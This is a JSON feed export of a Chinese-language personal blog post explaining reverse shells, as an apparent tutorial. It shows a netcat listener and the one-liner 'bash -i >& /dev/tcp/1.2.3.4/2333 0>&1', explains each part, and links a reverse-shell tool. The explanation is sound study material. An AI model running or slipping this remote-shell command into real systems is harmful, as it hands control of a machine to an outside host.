{
    "version": "https://jsonfeed.org/version/1",
    "title": "SnowRoll Blog • All posts by \"reverse-shell\" tag",
    "description": "分享经验，记录生活",
    "home_page_url": "https://snowroll.github.io",
    "items": [
        {
            "id": "https://snowroll.github.io/reverse-shell/",
            "url": "https://snowroll.github.io/reverse-shell/",
            "title": "反向shell",
            "date_published": "2022-08-13T07:05:11.000Z",
            "content_html": "<h1 id=\"什么是反向shell\"><a class=\"markdownIt-Anchor\" href=\"#什么是反向shell\">#</a> 什么是反向 shell</h1>\n<p>我们在客户端 A 通过 <code>ssh</code>  命令连接服务器 B，从而得到服务器 B 的终端命令行，客户端主动发起的这次连接过程我们称为正向 shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh test@10.10.10.1 </span><br></pre></td></tr></table></figure>\n<p>顾名思义，反向 shell 应该由服务器端 B 主动发起，而客户端 A 被动监听，接收这次连接。</p>\n<p>客户端 A （假设 ip 为 1.2.3.4）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 打开一个端口，监听连接请求</span></span><br><span class=\"line\">nc -lvvp 2333</span><br></pre></td></tr></table></figure>\n<p>nc（netcat）是 linux 中一个功能强大的网络命令行工具，常用于端口扫描，端口监听。</p>\n<p>参数说明：</p>\n<ul>\n<li>-l 使用监听模式</li>\n<li>-vv verbose，使用两次会有更多信息</li>\n<li>-p 本地端口</li>\n</ul>\n<p>客户端 A 打开了本地端口 2333，来监听连接请求。因此，我们只需要在服务器端 B 发起一个连接请求，将 B 的 shell 的输入输出发送过来即可完成反向 shell</p>\n<p>服务器端 B</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/1.2.3.4/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>这样就可以成功将 B 的 shell 命令行发送给 A，实现反向 shell</p>\n<p>参考文章： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC84MGQ2YjVhNjEzNzI=\">https://www.jianshu.com/p/80d6b5a61372</span></p>\n<p>命令详解：</p>\n<ul>\n<li>bash 命令行</li>\n<li>-i 交互模式</li>\n<li>&gt;&amp; 输出重定向，1 &gt; 可以省略为 &gt;，将标准输出和标准错误输出都重定向到远程。 文件的三种状态，0 标准输入， 1 标准输出， 2 错误输出</li>\n<li>/dev/tcp/${host}/${port} 建立一个 socket 连接，连接到其他机器</li>\n<li>0&gt;&amp;1 标准输入重定向到标准输出，由于标准输出已经定向到了远端机器上，所以输入、输出都将定向到远端机器上，实现了反向 shell</li>\n</ul>\n<p>由于 Linux 下一切皆文件，所以可以使用 <code>/dev/tcp</code>  创建一个 socket 套接字，而 <code>/$&#123;host&#125;/$&#123;port&#125;</code>  则是传入的参数。</p>\n<h1 id=\"反向shell工具\"><a class=\"markdownIt-Anchor\" href=\"#反向shell工具\">#</a> 反向 shell 工具</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ3NvY2tldC5pby9kZXBsb3kv\">gsocket.io</span></p>\n<h2 id=\"可能的问题\"><a class=\"markdownIt-Anchor\" href=\"#可能的问题\">#</a> 可能的问题</h2>\n<ul>\n<li>\n<p>shell 反弹失败</p>\n<p>可能原因 1:</p>\n<p>ubuntu 系统打开的终端默认为 <code>sh</code> ，而 <code>sh</code>  实际指向的是非交互式终端  <code>dash</code> ，需要先切换到 <code>bash</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bach -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>-c 执行 command string</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "linux",
                "reverse-shell"
            ]
        }
    ]
}